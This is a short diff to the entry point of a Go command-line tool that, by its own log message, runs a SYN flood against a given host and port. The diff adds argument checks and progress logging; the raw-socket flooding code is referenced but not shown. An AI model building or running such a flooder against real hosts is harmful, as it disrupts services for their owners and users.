@@ -24,8 +24,14 @@ func main() {
 	port := flag.Int("port", 0, "destination port")
 	flag.Parse()
 
+	if *host == "" || *port == 0 {
+		flag.Usage()
+		os.Exit(1)
+	}
+
 	dstIp := net.ParseIP(*host)
 	dstPort := uint16(*port)
+	log.Printf("starting syn-flood against %s:%d", dstIp, dstPort)
 
 	rawSocket, err := NewRawSocket(dstIp)
 	if err != nil {
@@ -37,7 +43,9 @@ func main() {
 	for i := 0; i < 2; i++ {
 		wg.Add(1)
 		go Run(wg, ctx, rawSocket, dstIp, dstPort)
+		log.Printf("started go routine %d", i)
 	}
+	log.Println("press ^C to stop")
 
 	termChan := make(chan os.Signal, 1)
 	signal.Notify(termChan, syscall.SIGINT, syscall.SIGTERM)
